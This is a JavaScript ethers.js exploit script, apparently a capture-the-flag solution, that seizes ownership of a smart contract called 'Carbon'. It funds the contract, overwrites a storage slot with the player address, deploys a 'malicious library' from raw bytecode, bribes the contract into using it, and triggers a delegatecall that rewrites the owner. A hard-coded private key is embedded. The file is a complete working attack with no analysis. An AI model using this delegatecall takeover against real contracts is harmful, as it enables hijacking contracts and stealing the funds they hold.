// Exploit script
const { ethers } = require("ethers")

async function main() {
  // Connect to the network
  const provider = new ethers.providers.JsonRpcProvider(
    "https://otter.bordel.wtf/erigon"
  )
  const privateKey =
    "0x98735bce098d19bcc444931be89000b660448196228beaa0d7ab82d3dbbc9a48"
  const wallet = new ethers.Wallet(privateKey, provider)

  const CARBON_ADDRESS = "0xC7Be527bD9B775Af87279B46d774F83aCc501b21"
  const PLAYER_ADDRESS = "0xC0b59e2B45A12481B1fa2EB27C5503Ab6BE97F63"

  // Carbon contract ABI
  const carbonABI = [
    "function receieve() public payable",
    "function setMessage(uint256 m) public",
    "function bribe(address a) external payable",
    "function claimCertificate(address contributor) public",
    "function owner() public view returns (address)",
  ]

  // Connect to the Carbon contract
  const carbonContract = new ethers.Contract(CARBON_ADDRESS, carbonABI, wallet)

  console.log("Starting exploit...")

  try {
    // Step 1: Contribute 0.3 ETH via receieve function
    console.log("Contributing 0.3 ETH...")
    const tx1 = await carbonContract.receieve({
      value: ethers.utils.parseEther("0.3"),
    })
    await tx1.wait()
    console.log("Contribution successful")

    // Step 2: Set message to our address (converted to uint256)
    console.log("Setting message...")
    const messageValue = ethers.BigNumber.from(PLAYER_ADDRESS)
    const tx2 = await carbonContract.setMessage(messageValue)
    await tx2.wait()
    console.log("Message set successfully")

    // Step 3: Deploy the malicious library contract
    console.log("Deploying malicious library...")
    const MaliciousFactory = await ethers.ContractFactory.fromSolidity(
      {
        sourceName: "MaliciousLibrary",
        abi: [],
        bytecode:
          "0x6080604052348015600e575f5ffd5b506101558061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c8063d4461f481461002d575b5f5ffd5b610047600480360381019061004291906100e1565b610049565b005b805f555050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61007d82610054565b9050919050565b61008d81610073565b8114610097575f5ffd5b50565b5f813590506100a881610084565b92915050565b5f819050919050565b6100c0816100ae565b81146100ca575f5ffd5b50565b5f813590506100db816100b7565b92915050565b5f5f604083850312156100f7576100f6610050565b5b5f6101048582860161009a565b9250506020610115858286016100cd565b915050925092905056fea2646970667358221220b37375f86458a080eea07aacb51d512323e0d9fdff37bc15c561754c691436f464736f6c634300081c0033",
      },
      wallet
    )
    const maliciousLib = await MaliciousFactory.deploy()
    await maliciousLib.deployed()
    console.log("Malicious library deployed at:", maliciousLib.address)

    // Step 4: Bribe to set factory address
    console.log("Sending bribe...")
    const tx3 = await carbonContract.bribe(maliciousLib.address, {
      value: ethers.utils.parseEther("1.0"),
    })
    await tx3.wait()
    console.log("Bribe sent successfully")

    // Step 5: Trigger the delegatecall to change owner
    console.log("Claiming certificate...")
    const tx4 = await carbonContract.claimCertificate(wallet.address, {
      gasLimit: 100000000,
    })
    await tx4.wait()
    console.log("Certificate claimed")

    // Verify the exploit worked
    const newOwner = await carbonContract.owner()
    console.log("New owner:", newOwner)
    console.log("Player address:", PLAYER_ADDRESS)
    console.log(
      "Exploit " +
        (newOwner.toLowerCase() === PLAYER_ADDRESS.toLowerCase()
          ? "successful!"
          : "failed!")
    )
  } catch (error) {
    console.error("Error during exploit:", error)
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
